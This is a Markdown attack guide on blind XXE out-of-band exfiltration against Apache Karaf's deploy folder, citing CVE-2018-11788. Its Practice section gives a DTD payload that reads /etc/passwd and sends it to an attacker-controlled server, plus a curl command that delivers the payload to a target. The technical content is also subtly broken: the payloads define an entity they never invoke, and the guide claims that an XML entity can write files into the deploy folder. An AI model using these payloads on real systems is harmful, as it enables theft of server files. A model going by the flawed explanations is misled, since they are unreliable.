---
title: Exploit XXE OOB with Apache Karaf Deploy Folder
description: Guide to exploiting XXE vulnerabilities in Apache Karaf for OOB data
  exfiltration using deploy folder injection.
keywords:
- XXE
- Apache Karaf
- OOB exfiltration
- deploy folder injection
- CVE-2018-11788
- blind XXE
- security
- XML parsing
---

# XXE OOB with Apache Karaf

## Context

This article focuses on exploiting a blind XML External Entity (XXE) vulnerability for out-of-band (OOB) data exfiltration specifically using Apache Karaf's deploy folder injection, as disclosed in CVE-2018-11788. This guide assumes familiarity with XML parsing, the fundamentals of blind XXE vulnerabilities, and concepts related to OOB exfiltration.

## Theory

### Apache Karaf Deploy Folder Injection (CVE-2018-11788)

Apache Karaf is a versatile, modular OSGi runtime environment. One of its features is the `deploy` folder, which automatically loads and executes bundles placed within it. Prior to version 4.2.2, a vulnerability allowed attackers to exploit XXE to write arbitrary files to this folder. This could trigger either code execution or enable data exfiltration by writing sensitive files to locations controlled by the attacker. The `deploy` folder is intended for trusted operations; however, an XXE vulnerability can break this trust, allowing malicious file injection.

### XXE Payloads for OOB Exfiltration via Deploy Folder

The essence of using XXE for OOB data exfiltration is that it leverages the XML parser's ability to resolve and action external entities. Through this, an attacker can cause the parser to fetch and write both local and remote files to locations they control or monitor. Typically, a DTD (Document Type Definition) is injected, which instructs the parser to act upon these entities, thus bypassing any direct output restrictions by causing effects such as file creation at unwanted locations.

### OOB Data Exfiltration with Canarytokens

Canarytokens are unique resources, such as URLs or files, designed to alert when accessed. By strategically placing canarytokens within exfiltrated data flows, attackers can ensure they receive real-time alerts whenever data is accessed or manipulated. This method is particularly useful for tracking unintended usage or access to exfiltrated data, making it a pivotal element in the exfiltration process.

## Practice

### Blind XXE OOB Exfiltration via Karaf Deploy Folder Injection

This section will guide you through exploiting the XXE vulnerability in Apache Karaf to exfiltrate sensitive information such as the `/etc/passwd` file using out-of-band channels.

- Craft a malicious DTD designed to exfiltrate `/etc/passwd` through Karaf's deploy folder by creating an external entity that fetches this file and sends it to an attacker-controlled server.  
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % all '<!ENTITY &#x25; send SYSTEM "http://attacker-server/?data=%file;">'>
  %all;
  ```
  This payload extracts the sensitive file and routes its contents to a server under attacker control.

- Modify the payload to write data to Karaf's deploy folder, leveraging its auto-processing capabilities.
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % all '<!ENTITY &#x25; send SYSTEM "file:///opt/karaf/deploy/evil.txt">'>
  %all;
  ```
  In this version, the DTD writes the file content directly to the deploy folder designated for automatic processing by Karaf.

- Deliver the crafted payload to the XML endpoint, referencing the malicious DTD, by sending a request to the target system.
  ```bash
  curl -X POST -d @malicious.xml http://target/vulnerable-endpoint
  ```
  Replace the URL with the actual vulnerable endpoint and the payload file `malicious.xml` with your crafted XML data.

- Monitor the deploy folder or receive alerts from a canarytoken to verify successful file deployment or access.
  
Successful exploitation should result in the sensitive data in `/etc/passwd` being written to the monitored location on the attacker's server, or alert triggered through canarytokens.

## Tools

- **curl**
- **Canarytokens**
- **Burp Suite**